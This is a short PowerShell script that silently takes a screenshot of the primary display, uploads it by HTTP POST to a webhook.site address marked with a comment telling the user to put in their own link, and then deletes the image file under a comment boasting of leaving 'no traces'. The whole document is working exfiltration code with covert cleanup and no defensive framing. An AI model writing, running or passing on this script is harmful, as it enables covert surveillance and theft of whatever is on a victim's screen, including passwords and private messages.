$webhook = "https://webhook.site/ed6252c7-c2af-4b75-a059-97b062ba8d51"  # <-- APNA LINK YAHAN DALO
$path = "$env:TEMP\capture.png"

# Screenshot Capture
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object Drawing.Bitmap $screen.Width $screen.Height
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
$bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)

# Send to Webhook
Invoke-WebRequest -Uri $webhook -Method POST -InFile $path -ContentType "image/png" -UseBasicParsing

# Cleanup (No traces)
$graphics.Dispose()
$bmp.Dispose()
Remove-Item $path -Force
